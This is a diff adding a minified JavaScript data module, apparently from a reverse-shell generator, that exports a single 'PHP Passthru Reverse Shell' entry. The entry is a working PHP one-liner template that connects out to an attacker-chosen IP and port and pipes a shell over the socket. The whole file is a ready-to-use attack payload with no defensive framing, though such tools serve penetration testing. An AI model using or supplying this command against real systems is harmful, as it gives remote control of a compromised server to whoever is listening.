@@ -1,0 +1,1 @@
+const e=[{title:"PHP Passthru Reverse Shell",template:`php -r '$sock=fsockopen("{ip}",{port});passthru("sh <&3 >&3 2>&3");'`,description:"PHP one-liner reverse shell using passthru function."}],s={commands:e};export{e as commands,s as default};
